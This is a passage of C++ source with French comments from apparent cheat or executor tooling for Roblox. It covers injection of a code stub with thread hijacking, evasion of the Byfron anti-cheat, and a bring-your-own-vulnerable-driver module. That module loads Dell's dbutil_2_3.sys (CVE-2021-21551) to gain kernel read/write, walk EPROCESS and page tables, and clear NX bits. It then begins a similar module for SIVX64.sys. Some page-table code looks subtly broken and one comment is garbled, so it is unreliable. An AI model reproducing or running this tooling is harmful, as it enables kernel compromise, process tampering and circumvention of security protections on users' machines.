    BOOL okRd = ReadProcessMemory(proc.get(), stub, rd, sizeof(rd), &rr);
    {
        std::cout << "[probe-hijack] stub a 0x" << std::hex << reinterpret_cast<uintptr_t>(stub)
                  << ", bloc a 0x" << blk << std::dec << '\n'
                  << "  relecture (" << (int)rr << "o, " << (okRd ? "OK" : "LUE") << ") : ";
        for (int i = 0; i < 16; ++i) std::cout << std::hex << std::setw(2) << std::setfill('0')
                                               << (int)rd[i] << ' ';
        std::cout << std::dec << '\n';
        bool intact = (rr >= sizeof(kProbeHijackStub)) &&
                      std::memcmp(rd, kProbeHijackStub, 
                                  (sizeof(rd) < sizeof(kProbeHijackStub)) ? sizeof(rd) : sizeof(kProbeHijackStub)) == 0;
        if (!intact)
            std::cerr << "  [!] stub altere/vide a la relecture -> Byfron nettoie les pages\n"
                      << "      RWX ecrites depuis l'exterieur (l'ecriture marche, la\n"
                      << "      persistance EXECUTE non).\n";
        else
            std::cout << "  stub intact a la relecture -> persistance RWX OK.\n";
    }

    DWORD tid = FindHijackThread(pid);
    if (!tid) { std::cerr << "[probe-hijack] aucun thread utilisable.\n"; return 1; }
    UniqueHandle th(OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid));
    if (!th) {
        std::cerr << "[probe-hijack] OpenThread(" << tid << ") a echoue : " << GetLastError() << '\n';
        return 1;
    }

    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
    if (SuspendThread(th.get()) == (DWORD)-1) return 1;
    if (!GetThreadContext(th.get(), &ctx)) {
        std::cerr << "[probe-hijack] GetThreadContext KO : " << GetLastError() << '\n';
        ResumeThread(th.get()); return 1;
    }
    CONTEXT saved = ctx;
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    ctx.Rip = reinterpret_cast<uintptr_t>(stub);
    ctx.Rcx = blk;
    if (!SetThreadContext(th.get(), &ctx)) {
        std::cerr << "[probe-hijack] SetThreadContext KO : " << GetLastError() << '\n';
        ResumeThread(th.get()); return 1;
    }
    ResumeThread(th.get());
    std::cout << "[probe-hijack] thread " << tid << " detourne -> stub, RIP " << std::hex
              << saved.Rip << std::dec << "\n";

    int load = -1, pcall = -1, done = 0;
    bool finished = false;
    const ULONGLONG deadline = GetTickCount64() + 5000;
    uintptr_t lastRip = saved.Rip;
    int ripReads = 0;
    while (GetTickCount64() < deadline) {
        if (ReadExecStatus(proc.get(), blk, load, pcall, done) && done) { finished = true; break; }

        // En vol : re-suspend, lire le RIP -> le thread a-t-il avance dans le stub ?
        if (SuspendThread(th.get()) != (DWORD)-1) {
            CONTEXT rc{}; rc.ContextFlags = CONTEXT_CONTROL;
            if (GetThreadContext(th.get(), &rc)) {
                if (ripReads == 0 || rc.Rip != lastRip) {
                    std::cout << "[probe-hijack] RIP " << std::hex << rc.Rip << std::dec
                              << "  (stub=0x" << std::hex << reinterpret_cast<uintptr_t>(stub)
                              << "+" << (rc.Rip - reinterpret_cast<uintptr_t>(stub)) << std::dec
                              << ", dans le stub ? "
                              << (rc.Rip >= reinterpret_cast<uintptr_t>(stub) &&
                                  rc.Rip < reinterpret_cast<uintptr_t>(stub) + sizeof(kProbeHijackStub) + 16
                                      ? "OUI" : "NON") << ")\n";
                    lastRip = rc.Rip;
                }
                ++ripReads;
            }
            ResumeThread(th.get());
        }
        Sleep(150);
    }
    if (finished)
        std::cout << "[probe-hijack] EXECUTION OK : done=1, load=" << load
                  << ", pcall=" << pcall << "\n";
    else
        std::cerr << "[probe-hijack] done jamais ecrit en 5 s (load=" << load
                  << ", pcall=" << pcall << ")\n";

    // Restauration du contexte (essentiel même sur timeout).
    SuspendThread(th.get());
    saved.ContextFlags = CONTEXT_FULL;
    SetThreadContext(th.get(), &saved);
    ResumeThread(th.get());
    th.reset();

    VirtualFreeEx(proc.get(), stub, 0, MEM_RELEASE);
    VirtualFreeEx(proc.get(), reinterpret_cast<LPVOID>(blk), 0, MEM_RELEASE);

    if (finished)
        std::cout << "=> Le thread hijacking FONCTIONNE dans cette cible. Le -1/-1 des modes\n"
                  << "   precedents vient des adresses luau_load (ambigues, 3 matches).\n";
    else
        std::cout << "=> Byfron bloque AUSSI le detournement de thread : plus aucun vecteur\n"
                  << "   usermode realiste. Un kernel driver / hyperviseur serait necessaire.\n";
    return finished ? 0 : 3;
}

int RunHijackDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Livraison en memoire — Thread Hijacking ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    EnableDebugPrivilege();

    DWORD pid; std::string snippet; uintptr_t oL, oP, oS;
    if (!ParseTargetAndSnippet(positional, pid, snippet, oL, oP, oS, "hijack")) return 1;

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    const ModuleInfo* mod = nullptr; LuauVM vm;
    if (!ResolveRobloxVM(proc.get(), pid, mod, vm, oL, oP, oS)) return 1;
    if (!vm.state) { std::cerr << "lua_State non resolu (passe 0xstate en hexa).\n"; return 1; }

    // Cibler en priorité le thread SCRIPT porteur du lua_State : luau_load doit
    // tourner dans le thread auquel l'état appartient (sinon crash / refus).
    DWORD scriptTid = 0;
    if (!oS) FindLuaStateFromScriptThreads(pid, &scriptTid);
    if (scriptTid)
        std::cout << "[hijack] thread script porteur du lua_State : TID " << scriptTid << '\n';
    else
        std::cout << "[hijack] pas de thread script identifie, repli FindHijackThread.\n";

    int load = -1, pcall = -1;
    bool ok = ExecuteLuauSnippetHijack(proc.get(), pid, vm, snippet.c_str(), snippet.size(),
                                       &load, &pcall, 8000, scriptTid);
    std::cout << "luau_load " << load << ", lua_pcall " << pcall
              << "  (" << (ok ? "SUCCES" : "ECHEC") << ")\n";
    return ok ? 0 : 1;
}

// ---------------------------------------------------------------------------
// Module BYOVD : primitive R/W kernel via le driver Dell dbutil_2_3.sys
// (CVE-2021-21551, expose un IOCTL memmove non verifie).
//   - \\.\DBUtil_2_3
//   - IOCTL 0x9B0C1EC4 = lecture 8 octets depuis une adresse kernel
//   - IOCTL 0x9B0C1EC8 = ecriture 8 octets vers une adresse kernel
//   - struct 32 octets : { padding, void* addr, uint64 zero, uint64 value }
// Utilite : avec ce R/W kernel, on peut effacer le bit NX (63) du PTE d'une
// page injectee dans le processus Roblox => le hijack setcontext redevient
// executable (les guard pages Byfron ne s'appliquent plus a notre page).
// ---------------------------------------------------------------------------
#define DBUTIL_IOCTL_READ  0x9B0C1EC4UL
#define DBUTIL_IOCTL_WRITE 0x9B0C1EC8UL
#define DBUTIL_DEVICE      L"\\\\.\\DBUtil_2_3"

struct DbutilIoctl {
    uint64_t padding;   // peut etre n'importe quoi
    void*    addr;      // adresse kernel cible (destination d'ecriture / source de lecture)
    uint64_t zero;      // doit etre 0
    uint64_t value;     // valeur (source d'ecriture / resultat de lecture)
};

// Vrai si au moins une instance du driver Dell vulnerable est chargee.
bool DbutilDriverPresent() {
    SC_HANDLE sc = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!sc) return false;
    bool found = false;
    DWORD needed = 0, count = 0, resType = 0;
    EnumServicesStatusExW(sc, SC_ENUM_PROCESS_INFO, SERVICE_KERNEL_DRIVER, SERVICE_STATE_ALL,
                          nullptr, 0, &needed, &count, &resType, nullptr);
    if (needed) {
        std::vector<BYTE> buf(needed);
        ENUM_SERVICE_STATUS_PROCESSW* svc =
            reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buf.data());
        if (EnumServicesStatusExW(sc, SC_ENUM_PROCESS_INFO, SERVICE_KERNEL_DRIVER,
                                  SERVICE_STATE_ALL, buf.data(), needed, &needed,
                                  &count, &resType, nullptr)) {
            for (DWORD i = 0; i < count; ++i) {
                std::wstring n = svc[i].lpServiceName;
                for (wchar_t& c : n) if (c >= L'A' && c <= L'Z') c = static_cast<wchar_t>(c + 32);
                if (n.find(L"dbu") == 0 || n.find(L"dbutil") != std::wstring::npos) { found = true; break; }
            }
        }
    }
    CloseServiceHandle(sc);
    return found;
}

// Recherche dbutil_2_3.sys sur le disque (chemins typiques Dell).
bool FindDbutilSysPath(std::wstring& out) {
    const wchar_t* candidates[] = {
        L"C:\\Windows\\System32\\drivers\\dbutil_2_3.sys",
        L"C:\\Windows\\System32\\DriverStore\\FileRepository\\dbutil_2_3.sys",
        L"C:\\Program Files\\Dell\\SupportAssist\\dbutil_2_3.sys",
        L"C:\\Program Files\\Dell\\Dell Command Update\\dbutil_2_3.sys",
        L"C:\\Program Files\\DellCommandHelper\\dbutil_2_3.sys",
    };
    for (auto* p : candidates)
        if (GetFileAttributesW(p) != INVALID_FILE_ATTRIBUTES) { out = p; return true; }
    // Recherche dans Windows\Temp (les installateurs Dell y deploient le driver) :
    WIN32_FIND_DATAW fd{};
    HANDLE hf = FindFirstFileW(L"C:\\Windows\\Temp\\dbutil*", &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        std::wstring p = std::wstring(L"C:\\Windows\\Temp\\") + fd.cFileName;
        FindClose(hf);
        out = p;
        return true;
    }
    return false;
}

// Charge le driver Dell vulnerable en tant que service kernel puis le demarre.
bool LoadDbutilDriver(const std::wstring& sysPath) {
    SC_HANDLE sc = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!sc) { std::cerr << "[byovd] OpenSCManager : " << GetLastError() << '\n'; return false; }
    std::wstring name = L"dbutil_2_3";
    SC_HANDLE svc = CreateServiceW(sc, name.c_str(), name.c_str(),
                                   SERVICE_START | DELETE | SERVICE_STOP,
                                   SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                                   SERVICE_ERROR_NORMAL, sysPath.c_str(), nullptr,
                                   nullptr, nullptr, nullptr, nullptr);
    if (!svc) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_EXISTS) {
            std::cerr << "[byovd] CreateService : " << err << '\n';
            CloseServiceHandle(sc);
            return false;
        }
        svc = OpenServiceW(sc, name.c_str(), SERVICE_START | DELETE | SERVICE_STOP);
    }
    if (!svc) { std::cerr << "[byovd] OpenService : " << GetLastError() << '\n'; CloseServiceHandle(sc); return false; }
    if (!StartServiceW(svc, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            std::cerr << "[byovd] StartService : " << err << '\n';
            DeleteService(svc);
            CloseServiceHandle(svc); CloseServiceHandle(sc);
            return false;
        }
    }
    std::cout << "[byovd] driver demarre.\n";
    CloseServiceHandle(svc);
    CloseServiceHandle(sc);
    return true;
}

// Ouvre le device \\.\DBUtil_2_3 et verifie la primitive R/W sur kernel32.data
// (lecture test). Retourne INVALID_HANDLE_VALUE si le driver refuse.
HANDLE OpenDbutilDevice() {
    HANDLE h = CreateFileW(DBUTIL_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        std::cerr << "[byovd] CreateFile(" << DBUTIL_DEVICE << ") : " << GetLastError() << '\n';
    return h;
}

bool DbutilReadKernel(HANDLE dev, uintptr_t kernelAddr, uint64_t& out) {
    DbutilIoctl in{};
    in.padding = 0x42424242;
    in.addr = reinterpret_cast<void*>(kernelAddr);
    in.zero = 0;
    in.value = 0;
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(dev, DBUTIL_IOCTL_READ, &in, sizeof(in),
                              &in, sizeof(in), &ret, nullptr);
    if (ok) out = in.value;
    return ok && ret == sizeof(in);
}

bool DbutilWriteKernel(HANDLE dev, uintptr_t kernelAddr, uint64_t value) {
    DbutilIoctl in{};
    in.padding = 0x42424242;
    in.addr = reinterpret_cast<void*>(kernelAddr);
    in.zero = 0;
    in.value = value;
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(dev, DBUTIL_IOCTL_WRITE, &in, sizeof(in),
                              nullptr, 0, &ret, nullptr);
    return ok != FALSE;
}

// ---------------------------------------------------------------------------
// Walk EPROCESS : on repere la liste de processus active via PsActiveProcessHead.
// On trouve cette tete en scannant ntoskrnl pour la reference (lea rip + rel32)
// dans PsGetNextProcess. La recherche est faite depuis l'espace kernel via la
// primitive R/W (noyau lu directement).
// ---------------------------------------------------------------------------
struct KernelInfo {
    uintptr_t ntBase;            // base virtuelle kernel de ntoskrnl.exe
    uintptr_t psActiveProcessHead; // adresse de la LIST_ENTRY tete
    uint64_t  uniquePidOffset;   // offset EPROCESS.UniqueProcessId (varie)
    uint64_t  activeLinksOffset; // offset EPROCESS.ActiveProcessLinks
    uint64_t  dirTableBaseOffset; // offset EPROCESS.DirectoryTableBase (CR3)
};

bool ReadKernelBytes(HANDLE dev, uintptr_t addr, void* buf, size_t n) {
    uint8_t* dst = static_cast<uint8_t*>(buf);
    for (size_t i = 0; i < n; i += 8) {
        uint64_t v = 0;
        if (!DbutilReadKernel(dev, addr + i, v)) return false;
        size_t c = std::min<size_t>(8, n - i);
        std::memcpy(dst + i, &v, c);
    }
    return true;
}

// Trouve ntoskrnl.exe et son adresse kernel via la table des modules systeme.
bool FindNtOsKernelBase(uintptr_t& base) {
    static const auto NtQS = reinterpret_cast<NTSTATUS(WINAPI*)(ULONG, PVOID, ULONG, PULONG)>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!NtQS) return false;
    ULONG sz = 0;
    struct ModEntry { char name[448]; };  // poid forme reelle ignoree, on relit pointeur
    if (NtQS(11, nullptr, 0, &sz) != 0xC0000004L) return false;  // STATUS_INFO_LENGTH_MISMATCH attendu
    std::vector<BYTE> buf(sz);
    if (NtQS(11, buf.data(), sz, nullptr) != 0) return false;
    // Structure : count(PVOID) puis table d'entrees { void* base; ULONG size; ULONG flags; USHORT idx; USHORT nlen; USHORT cpath; UNICODE_STRING path; }
    uint32_t count = 0; std::memcpy(&count, buf.data(), 4);
    uintptr_t desc = reinterpret_cast<uintptr_t>(buf.data()) + 8;
    for (uint32_t i = 0; i < count; ++i) {
        uintptr_t e = desc + static_cast<uintptr_t>(i) * 256;
        uintptr_t b = 0; std::memcpy(&b, reinterpret_cast<void*>(e), sizeof(b));
        // ImageName est une UNICODE_STRING (Buffer/RVA) + tableau de wchar : on cherche "ntoskrnl"
        const wchar_t* w = reinterpret_cast<const wchar_t*>(e + 24 + 8 + 4 + 2 + 2 + 2);
        std::wstring name;
        for (int k = 0; k < 64; ++k) { if (!w[k]) break; name += w[k]; }
        if (name.find(L"ntoskrnl") != std::wstring::npos) { base = b; return true; }
    }
    return false;
}

// Scan d'une fenetre du noyau pour le motif de la reference a PsActiveProcessHead.
// Le motif recherche est la forme classique :
//   48 8D 0D xx xx xx xx   (lea rcx,[rip+rel32])  -> PsActiveProcessHead
// utilise dans PsGetNextProcess avant l'appel a ExInsertTailObject.
bool FindPsActiveProcessHead(HANDLE dev, uintptr_t ntBase, size_t size,
                             uintptr_t& outHead) {
    const size_t window = 0x200000; // scan 2 Mo du noyau à partir de la base
    std::vector<uint8_t> mem;
    size_t rd = 0;
    // Lit le noyau par blocs de 4 Ko via la primitive R/W (8 octets par IOCTL).
    const size_t chunk = 0x4000;
    mem.resize(chunk);
    for (uintptr_t off = 0; off < window && rd < chunk; off += chunk) {
        size_t got = 0;
        const uintptr_t adr = ntBase + off;
        uint8_t* dst = mem.data();
        bool okAll = true;
        for (size_t i = 0; i < chunk; i += 8, dst += 8, got += 8) {
            uint64_t v = 0;
            if (!DbutilReadKernel(dev, adr + i, v)) { okAll = false; break; }
            std::memcpy(dst, &v, 8);
        }
        if (!okAll) continue;
        rd += got;
        // recherche le motif dans ce bloc
        for (size_t i = 0; i + 7 < got; ++i) {
            if (mem[i] == 0x48 && mem[i+1] == 0x8D && mem[i+2] == 0x0D) {
                int32_t rel = 0;
                std::memcpy(&rel, mem.data() + i + 3, 4);
                uintptr_t target = adr + i + 7 + rel;
                outHead = target;
                (void)size;
                return true;
            }
        }
    }
    return false;
}

// Walk de la liste EPROCESS a la recherche d'un PID.
uintptr_t FindEprocessByPid(HANDLE dev, const KernelInfo& ki, DWORD pid) {
    uintptr_t flink = 0;
    if (!DbutilReadKernel(dev, ki.psActiveProcessHead, flink)) return 0;
    const size_t MAX_ITER = 2000;
    for (size_t it = 0; it < MAX_ITER; ++it) {
        if (!flink) return 0;
        uintptr_t ep = flink - ki.activeLinksOffset;
        uint64_t cand64 = 0;
        if (!DbutilReadKernel(dev, ep + ki.uniquePidOffset, cand64)) return 0;
        if (static_cast<DWORD>(cand64) == pid) return ep;
        // prochaine entrée : flink du noeud courant
        if (!DbutilReadKernel(dev, flink, flink)) return 0;
        if (flink == ki.psActiveProcessHead) break;
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Marche 4-niveaux des tables de pages (PML4 -> PDPT -> PD -> PT) d'apres CR3
// pour une adresse virtuelle utilisateur. Retourne l'adresse KERNEL du PTE
// (ou 0 si la page n'est pas presente). Toutes les lectures de tables se font
// via la primitive R/W (les tables sont en memoire physique, relue via le miroir
// kernel de la RAM : on lit l'<< adresse physique >> en l'interpretant comme
// adresse virtuelle kernel, technique standard).
// ---------------------------------------------------------------------------
uintptr_t WalkPte(HANDLE dev, uintptr_t cr3, uintptr_t va) {
    auto readPhys = [&](uintptr_t pa, uint64_t& v) -> bool {
        return DbutilReadKernel(dev, pa, v);  // les PTE sont dans l'espace kernel mappe
    };
    uint64_t pml4 = 0;
    if (!readPhys(cr3 + ((va >> 39) & 0x1FF) * 8, pml4) || !(pml4 & 1)) return 0;
    uint64_t pdpt = 0;
    if (!readPhys((pml4 & 0x000FFFFFFFFFF000ULL) + ((va >> 30) & 0x1FF) * 8, pdpt) || !(pdpt & 1)) return 0;
    if (pdpt & (1ULL << 7)) return 0;  // grande page 1G : pas de PTE final exploitable ici
    uint64_t pd = 0;
    if (!readPhys((pdpt & 0x000FFFFFFFFFF000ULL) + ((va >> 21) & 0x1FF) * 8, pd) || !(pd & 1)) return 0;
    if (pd & (1ULL << 7)) return 0;    // grande page 2M
    uint64_t pt = 0;
    if (!readPhys((pd & 0x000FFFFFFFFFF000ULL) + ((va >> 12) & 0x1FF) * 8, pt) || !(pt & 1)) return 0;
    // adresse du PTE dans l'espace kernel : alias direct de la table
    return (pd & 0x000FFFFFFFFFF000ULL) + ((va >> 12) & 0x1FF) * 8;
}

// Efface le bit NX (63) d'un PTE, puis flush TLB par un WriteKernel larve
// (le prochain acces re-fait la marche).
bool ClearPteNx(HANDLE dev, uintptr_t pteKernelAddr) {
    uint64_t pte = 0;
    if (!DbutilReadKernel(dev, pteKernelAddr, pte)) return false;
    pte &= ~(1ULL << 63);
    return DbutilWriteKernel(dev, pteKernelAddr, pte);
}

// ---------------------------------------------------------------------------
// Met a jour l'adresse de PsActiveProcessHead et les offsets en fonction de la
// version du noyau. Les offsets EPROCESS classiques Win10/11 x64 (uniquePid et
// activeLinks) sont retrouves par une simple heuristique sur la base + pid 4.
// ---------------------------------------------------------------------------
bool BuildKernelInfo(HANDLE dev, KernelInfo& ki, DWORD targetPid) {
    if (!FindNtOsKernelBase(ki.ntBase)) { std::cerr << "[byovd] ntoskrnl introuvable.\n"; return false; }
    std::cout << "[byovd] ntoskrnl @ 0x" << std::hex << ki.ntBase << std::dec << '\n';
    if (!FindPsActiveProcessHead(dev, ki.ntBase, 0, ki.psActiveProcessHead)) {
        std::cerr << "[byovd] PsActiveProcessHead introuvable.\n"; return false;
    }
    std::cout << "[byovd] PsActiveProcessHead @ 0x" << std::hex << ki.psActiveProcessHead << std::dec << '\n';
    // heuristique basique : supposés Win10/11 classiques
    ki.uniquePidOffset = 0x440;
    ki.activeLinksOffset = 0x448;
    ki.dirTableBaseOffset = 0x28;
    // affiner : lire le premier processus (System pid4) et verifier l'offset
    uintptr_t flink = 0;
    if (DbutilReadKernel(dev, ki.psActiveProcessHead, flink)) {
        uintptr_t first = flink - ki.activeLinksOffset;
        uint64_t pid = 0;
        if (DbutilReadKernel(dev, first + ki.uniquePidOffset, pid) && pid == 4) {
            std::cout << "[byovd] System (pid 4) confirme aux offsets ep=0x"
                      << std::hex << ki.uniquePidOffset << "/" << ki.activeLinksOffset << std::dec << '\n';
        } else {
            std::cout << "[byovd] remarque : offsets EPROCESS par defaut a verifier.\n";
        }
    }
    return true;
}

// Integre le bypass kernel dans le hijack : efface le bit NX du PTE de la page
// du stub apres injection, puis detourne le thread comme d'habitude.
bool ExecuteLuauSnippetHijackByovd(HANDLE proc, DWORD pid, const LuauVM& vm, const char* code,
                                   size_t codeLen, int* outLoad = nullptr, int* outPcall = nullptr,
                                   int timeoutMs = 8000, DWORD preferTid = 0) {
    HANDLE dev = OpenDbutilDevice();
    if (dev == INVALID_HANDLE_VALUE) {
        std::cerr << "[hijack+byovd] driver vulnerable indisponible.\n";
        return false;
    }
    KernelInfo ki{};
    if (!BuildKernelInfo(dev, ki, pid)) { CloseHandle(dev); return false; }
    // retrouve l'EPROCESS du processus cible
    uintptr_t ep = FindEprocessByPid(dev, ki, pid);
    if (!ep) { std::cerr << "[hijack+byovd] EPROCESS du PID " << pid << " introuvable.\n"; CloseHandle(dev); return false; }
    uintptr_t cr3 = 0;
    if (!DbutilReadKernel(dev, ep + ki.dirTableBaseOffset, cr3)) { CloseHandle(dev); return false; }
    std::cout << "[hijack+byovd] EPROCESS 0x" << std::hex << ep << ", CR3 0x" << cr3 << std::dec << '\n';

    // ----- allocation et ecriture du stub comme le hijack classique -----
    ExecBlock blk = AllocateExecBlock(proc, vm, code, codeLen);
    if (!blk.base) { std::cerr << "[hijack+byovd] allocation du bloc a echoue\n"; CloseHandle(dev); return false; }
    uintptr_t stub = 0;
    auto freeAll = [&] {
        if (stub) VirtualFreeEx(proc, reinterpret_cast<LPVOID>(stub), 0, MEM_RELEASE);
        if (blk.base) VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE);
    };
    if (!AllocateHijackStub(proc, stub)) { freeAll(); CloseHandle(dev); return false; }

    // ----- erreur : le stub est dans l'espace utilisateur du processus cible.
    // Le calcul du PTE se fait sur l'adresse utilisateur du stub tel que vu par
    // le processus distant. Ici blob.base et stub sont des adresses dans la
    // fenetre utilisateur du processus cible (aio). Le tienen de CR3 de la table
    // de pages derivee de l'EPROCESS nous donne le bon PTE -----
    uintptr_t pteStub = WalkPte(dev, cr3, stub);
    if (pteStub) {
        if (ClearPteNx(dev, pteStub))
            std::cout << "[hijack+byovd] NX efface sur le PTE du stub (0x" << std::hex
                      << stub << std::dec << ")\n";
        else
            std::cout << "[hijack+byovd] impossible d'effacer le NX du stub.\n";
    } else {
        std::cout << "[hijack+byovd] PTE du stub non present (l'ecriture RW ne cree pas le PTE EXEC ?)\n";
    }

    // ----- hijack du thread cible comme ExecuteLuauSnippetHijack -----
    DWORD tid = preferTid ? preferTid : FindHijackThread(pid);
    if (!tid) { std::cerr << "[hijack+byovd] aucun thread utilisable.\n"; freeAll(); CloseHandle(dev); return false; }
    UniqueHandle th(OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid));
    if (!th) { std::cerr << "[hijack+byovd] OpenThread(" << tid << ") : " << GetLastError() << '\n'; freeAll(); CloseHandle(dev); return false; }

    CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
    if (SuspendThread(th.get()) == (DWORD)-1) { freeAll(); CloseHandle(dev); return false; }
    if (!GetThreadContext(th.get(), &ctx)) {
        std::cerr << "[hijack+byovd] GetThreadContext : " << GetLastError() << '\n';
        ResumeThread(th.get()); freeAll(); CloseHandle(dev); return false;
    }
    CONTEXT saved = ctx;
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    ctx.Rip = stub;
    ctx.Rcx = blk.base;
    if (!SetThreadContext(th.get(), &ctx)) {
        std::cerr << "[hijack+byovd] SetThreadContext : " << GetLastError() << '\n';
        ResumeThread(th.get()); freeAll(); CloseHandle(dev); return false;
    }
    ResumeThread(th.get());
    std::cout << "[hijack+byovd] thread " << tid << " detourne -> stub, attente execution...\n";

    const ULONGLONG deadline = GetTickCount64() + static_cast<ULONGLONG>(timeoutMs);
    int load = -1, pcall = -1, done = 0;
    bool finished = false;
    while (GetTickCount64() < deadline) {
        if (!IsProcessAlive(proc)) break;
        if (ReadExecStatus(proc, blk.base, load, pcall, done) && done) { finished = true; break; }
        Sleep(25);
    }

    SuspendThread(th.get());
    saved.ContextFlags = CONTEXT_FULL;
    SetThreadContext(th.get(), &saved);
    ResumeThread(th.get());
    th.reset();

    freeAll();
    CloseHandle(dev);
    if (outLoad)  *outLoad  = load;
    if (outPcall) *outPcall = pcall;
    if (finished)
        std::cout << "[hijack+byovd] execution terminee (luau_load " << load
                  << ", lua_pcall " << pcall << ").\n";
    else
        std::cerr << "[hijack+byovd] delai depasse (" << timeoutMs << " ms).\n";
    return finished && load == 0 && pcall == 0;
}

// Charge / verifie la presence du driver Dell vulnerable.
bool EnsureDbutilLoaded() {
    if (DbutilDriverPresent()) {
        std::cout << "[byovd] driver deja charge comme service.\n";
        return true;
    }
    std::wstring p;
    if (!FindDbutilSysPath(p)) {
        std::cerr << "[byovd] driver Dell introuvable. Le driver dbutil_2_3.sys doit etre\n"
                     "  present (machine Dell ou telecharge depuis une source fiable).\n";
        return false;
    }
    std::cout << "[byovd] driver trouve : " << std::string(p.begin(), p.end()) << '\n';
    return LoadDbutilDriver(p);
}

// --byovd : demo de la primitive kernel R/W (lecture de la base de ntoskrnl
// et parcours de la liste de processus pour retrouver la cible).
int RunByovdDemo(const std::vector<const char*>& positional) {
    std::cout << "=== BYOVD (dbutil_2_3.sys) — primitive R/W kernel ===\n\n";
    if (!EnsureDbutilLoaded()) return 2;
    HANDLE dev = OpenDbutilDevice();
    if (dev == INVALID_HANDLE_VALUE) return 1;
    KernelInfo ki{};
    if (!BuildKernelInfo(dev, ki, 0)) { CloseHandle(dev); return 1; }

    std::cout << "--- Liste d'EPROCESS (extrait) ---\n";
    uintptr_t flink = 0;
    if (DbutilReadKernel(dev, ki.psActiveProcessHead, flink)) {
        uintptr_t head = ki.psActiveProcessHead;
        for (int i = 0; i < 20 && flink && flink != head; ++i) {
            uintptr_t ep = flink - ki.activeLinksOffset;
            uint64_t pid64 = 0;
            DbutilReadKernel(dev, ep + ki.uniquePidOffset, pid64);
            // image name (16+ octets a ap=0x5A8)
            char img[20] = {0};
            ReadKernelBytes(dev, ep + 0x5A8, img, sizeof(img) - 1);
            std::cout << "  " << std::setw(6) << pid64 << "  " << img << "  (ep 0x" << std::hex
                      << ep << std::dec << ")\n";
            if (!DbutilReadKernel(dev, flink, flink)) break;
        }
    }
    CloseHandle(dev);
    return 0;
}

// --hijack-byovd : hijack classique + nettoyage du bit NX du PTE du stub via
// la primitive kernel. Memes arguments que --hijack.
int RunHijackByovdDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Livraison — Thread Hijacking + bypass kernel (NX PTE) ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    EnableDebugPrivilege();

    DWORD pid; std::string snippet; uintptr_t oL, oP, oS;
    if (!ParseTargetAndSnippet(positional, pid, snippet, oL, oP, oS, "hijack-byovd")) return 1;

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    const ModuleInfo* mod = nullptr; LuauVM vm;
    if (!ResolveRobloxVM(proc.get(), pid, mod, vm, oL, oP, oS)) return 1;
    if (!vm.state) { std::cerr << "lua_State non resolu (passe 0xstate en hexa).\n"; return 1; }

    DWORD scriptTid = 0;
    if (!oS) FindLuaStateFromScriptThreads(pid, &scriptTid);
    if (scriptTid)
        std::cout << "[hijack+byovd] thread script porteur du lua_State : TID " << scriptTid << '\n';
    else
        std::cout << "[hijack+byovd] pas de thread script identifie, repli FindHijackThread.\n";

    if (!EnsureDbutilLoaded()) return 2;

    int load = -1, pcall = -1;
    bool ok = ExecuteLuauSnippetHijackByovd(proc.get(), pid, vm, snippet.c_str(), snippet.size(),
                                            &load, &pcall, 8000, scriptTid);
    std::cout << "luau_load " << load << ", lua_pcall " << pcall
              << "  (" << (ok ? "SUCCES" : "ECHEC") << ")\n";
    return ok ? 0 : 1;
}

// ---------------------------------------------------------------------------
// BYOVD-SIV : primitive R/W memoire PHYSIQUE via SIVX64.sys
// (System Information Viewer v5.87, Ray Hinchliffe / RH Software).
//   - Service kernel "SIVX64", device \\.\SIVDRIVER
//   - Cmd 0x10 : lecture physique scatter-gather (header + buffer sortie)
//   - Cmd 0x14 : écriture physique (header + payload, flags=0x0 pour ecrire)
//   - Acces reserve admin + SeDebugPrivilege (SeSinglePrivilegeCheck)
// ---------------------------------------------------------------------------
static const wchar_t* kSivDevice   = L"\\\\.\\SIVDRIVER";
static const wchar_t* kSivSvcName  = L"SIVX64";
static const uint32_t kSivCmdRead  = 0x10;
static const uint32_t kSivCmdWrite = 0x14;

#pragma pack(push,1)
struct SivIoHeader {
    uint64_t phys;
    uint32_t size;
    uint16_t flags;   // 0x0 = ecrire (cmd 0x14) ; bit 0x4 mis = readback (lecture de controle)
    uint16_t pad;
};
#pragma pack(pop)

// Vrai si le service SIVX64 est deja installe.
bool SivDriverPresent() {
    SC_HANDLE sc = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!sc) return false;
    SC_HANDLE svc = OpenServiceW(sc, kSivSvcName, SERVICE_QUERY_STATUS);
    bool found = (svc != nullptr);
    if (svc) CloseServiceHandle(svc);
    CloseServiceHandle(sc);
    return found;
}

// Recherche SIVX64.sys sur le disque (chemins typiques de deploiement).
